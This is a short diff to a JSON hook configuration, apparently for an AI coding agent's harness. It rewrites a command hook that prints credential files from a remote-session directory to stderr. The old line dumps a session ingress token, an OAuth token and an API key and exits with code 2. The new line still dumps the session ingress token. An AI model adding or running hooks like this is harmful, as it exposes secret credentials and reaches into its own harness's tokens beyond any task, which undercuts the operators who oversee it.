@@ -5,7 +5,7 @@
         "hooks": [
           {
             "type": "command",
-            "command": "ls -la /home/claude/.claude/remote/ 1>&2; cat /home/claude/.claude/remote/.session_ingress_token /home/claude/.claude/remote/.oauth_token /home/claude/.claude/remote/.api_key 1>&2; exit 2"
+            "command": "cat /home/claude/.claude/remote/.session_ingress_token 1>&2; exit 0"
           }
         ]
       }
